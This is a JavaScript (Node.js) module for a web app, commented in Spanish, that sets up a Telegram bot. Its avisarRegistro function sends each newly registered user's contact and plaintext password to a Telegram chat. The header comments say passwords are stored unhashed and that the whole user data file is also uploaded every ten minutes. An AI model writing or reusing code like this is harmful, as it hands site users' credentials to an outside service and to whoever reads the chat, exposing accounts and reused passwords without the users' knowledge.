// ============================================================
//  TELEGRAM: avisos y copia de las credenciales de registro
// ============================================================
//  Un solo lugar con la configuracion del bot (token + chat):
//    - backup_telegram.js sube el data.json completo cada 10 minutos.
//    - routes/auth.js avisa de CADA registro nuevo con usuario y contrasena.
//
//  Motivo: las contrasenas se guardan en texto plano (decision del dueno),
//  pero ya no viven dentro del codigo del repo. Telegram queda como la copia
//  "a mano" de cada credencial en cuanto se crea la cuenta.
//
//  Si faltan TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID, esta parte queda
//  apagada y el servidor sigue funcionando igual (nunca tumba la web).
// ============================================================

const https = require('https');
const path = require('path');

require('dotenv').config({
  path: path.join(__dirname, '.env')
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const ACTIVO = Boolean(BOT_TOKEN && CHAT_ID);
const TIMEOUT_MS = 10000;

function log(...args) { console.log('[TELEGRAM]', ...args); }
function warn(...args) { console.warn('[TELEGRAM]', ...args); }

// ---- Mandar un texto al chat ----
function enviarMensaje(texto) {
  if (!ACTIVO) {
    warn('Sin TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID: el aviso NO se envio.');
    return Promise.resolve({ ok: false, motivo: 'Telegram sin configurar.' });
  }

  // Texto plano sin parse_mode: si la contrasena trae caracteres raros
  // (asteriscos, guiones bajos, llaves), Telegram no lo interpreta y no
  // lo rechaza por error de formato.
  const payload = JSON.stringify({ chat_id: CHAT_ID, text: texto });

  return new Promise((resolve) => {
    let terminado = false;
    const fin = (r) => { if (!terminado) { terminado = true; resolve(r); } };

    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
      }
    }, (res) => {
      let respuesta = '';
      res.on('data', (c) => { respuesta += c; });
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          log('Mensaje enviado.');
          fin({ ok: true });
        } else {
          warn(`Telegram respondio ${res.statusCode}: ${respuesta.slice(0, 200)}`);
          fin({ ok: false, motivo: `HTTP ${res.statusCode}` });
        }
      });
    });

    req.setTimeout(TIMEOUT_MS, () => {
      req.destroy();
      fin({ ok: false, motivo: 'Tardo demasiado (timeout).' });
    });

    req.on('error', (e) => {
      warn('Error al enviar:', e.message);
      fin({ ok: false, motivo: e.message });
    });

    req.write(payload);
    req.end();
  });
}

// ---- Aviso de cada registro nuevo ----
function avisarRegistro(usuario) {
  const texto = [
    'AFXX | REGISTRO NUEVO',
    '',
    `Usuario: ${usuario.contact}`,
    `Contrasena: ${usuario.password}`,
    `Fecha: ${new Date().toISOString()}`
  ].join('\n');

  return enviarMensaje(texto).then((r) => {
    if (!r.ok) warn('No se pudo avisar el registro:', r.motivo);
    return r;
  });
}

// ---- Para el panel de admin ----
function estado() {
  return {
    activo: ACTIVO,
    botToken: BOT_TOKEN ? `${BOT_TOKEN.slice(0, 10)}...` : null,
    chatId: CHAT_ID ? `...${String(CHAT_ID).slice(-4)}` : null
  };
}

module.exports = { ACTIVO, enviarMensaje, avisarRegistro, estado };
